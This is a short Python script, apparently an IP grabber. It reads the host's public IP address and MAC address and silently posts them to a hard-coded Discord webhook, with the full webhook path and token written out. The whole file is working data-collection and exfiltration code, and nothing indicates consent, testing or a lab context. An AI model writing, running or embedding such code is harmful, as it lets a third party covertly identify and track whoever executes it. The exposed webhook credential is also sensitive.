import http.client
import json
import uuid

def get_public_ip():
    try:
        conn = http.client.HTTPSConnection("api.ipify.org")
        conn.request("GET", "/?format=json")
        response = conn.getresponse()
        data = response.read().decode("utf-8")
        conn.close()
        ip_data = json.loads(data)
        return ip_data.get("ip", "Unable to fetch IP")
    except Exception:
        return "Unable to fetch IP"

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    return mac

webhook_url = "discord.com"
webhook_path = "/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK"

public_ip = get_public_ip()
mac_address = get_mac_address()

message = {
    "content": f"Public IP Address: `{public_ip}`\nMAC Address: `{mac_address}`"
}

conn = http.client.HTTPSConnection(webhook_url)
json_message = json.dumps(message)

headers = {
    'Content-Type': 'application/json'
}

conn.request("POST", webhook_path, body=json_message, headers=headers)

response = conn.getresponse()
conn.close()
